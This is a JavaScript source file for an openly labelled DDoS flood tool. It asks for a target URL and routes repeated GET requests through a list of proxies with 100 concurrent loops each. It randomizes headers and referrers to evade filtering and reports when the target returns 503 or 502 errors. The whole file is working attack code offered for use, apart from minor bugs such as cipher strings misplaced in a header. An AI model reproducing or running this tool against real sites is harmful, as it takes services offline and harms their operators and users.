const axios = require("axios");
const fs = require("fs");
const path = require("path");
const SocksProxyAgent = require("socks-proxy-agent");
const HttpsProxyAgent = require("https-proxy-agent");
const chalk = require("chalk");
const readline = require("readline");

const { generateUserAgent } = require("./useragent.js");

const proxyFilePath = path.join(__dirname, "proxy.txt");
const maxRequests = Number.MAX_SAFE_INTEGER;
const requestsPerSecond = Number.MAX_SAFE_INTEGER;
const numThreads = 100;

const langHeaders = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "da, en -gb;q=0.8, en;q=0.7",
    "cs;q=0.5",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-NZ,en;q=0.9",
    "en-ZA,en;q=0.9"
];

const referrers = [
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=",
    "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://help.baidu.com/searchResult?keywords="
];

const cipherSuites = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384 :ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256 :ECDHE -RSA-AES128-SHA:E CDHE-ECDSA-AES128-S HA :ECDHE -RSA-AES256 -SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
];

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

const loadProxies = () => {
    try {
        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map((line) => line.trim());
    } catch {
        return [];
    }
};

const performAttack = (url, agent, headers) => {
    axios
        .get(url, { httpAgent: agent, headers, timeout: 0 })
        .then(() => setTimeout(() => performAttack(url, agent, headers), 0))
        .catch((err) => {
            if (err.response?.status === 503) {
                console.log(chalk.red("Target under heavy load (503)."));
            } else if (err.response?.status === 502) {
                console.log(chalk.red("Error: Bad Gateway (502)."));
            } else {
                console.log(chalk.red("Request error: " + err.message));
            }
            setTimeout(() => performAttack(url, agent, headers), 0);
        });
};

const startDdosAttack = async (targetUrl) => {
    if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
        console.log(chalk.red("Invalid URL. Please enter a valid URL starting with http:// or https://"));
        return;
    }

    const proxies = loadProxies();
    if (!proxies.length) {
        console.log(chalk.red("No proxies found. Please add proxies to the proxy file."));
        return;
    }

    const headers = {
        "Accept": getRandomElement(acceptHeaders),
        "Accept-Language": getRandomElement(langHeaders),
        "Cache-Control": getRandomElement(cipherSuites),
        "Referer": getRandomElement(referrers),
        "Connection": "keep-alive",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "TE": "Trailers",
    };

    let continueAttack = true;
    console.log(chalk.green("Starting DDOS ATTACK..."));

    for (let i = 0; i < numThreads; i++) {
        for (const proxy of proxies) {
            const [host, port] = proxy.split(":");
            let agent;

            const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
            const proxyUrl = `${proxyProtocol}://${host}:${port}`;

            agent = proxyProtocol === "socks5"
                ? new SocksProxyAgent(proxyUrl)
                : new HttpsProxyAgent(proxyUrl);

            performAttack(targetUrl, agent, headers);
        }
    }

    setTimeout(() => {
        continueAttack = false;
        console.log(chalk.green("Max flood requests reached. Attack stopped."));
    }, (maxRequests / requestsPerSecond) * 1000);
};

// Prompt for user input
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question(chalk.red("Enter the target URL (http:// or https://): "), (targetUrl) => {
    startDdosAttack(targetUrl);
    rl.close();
});
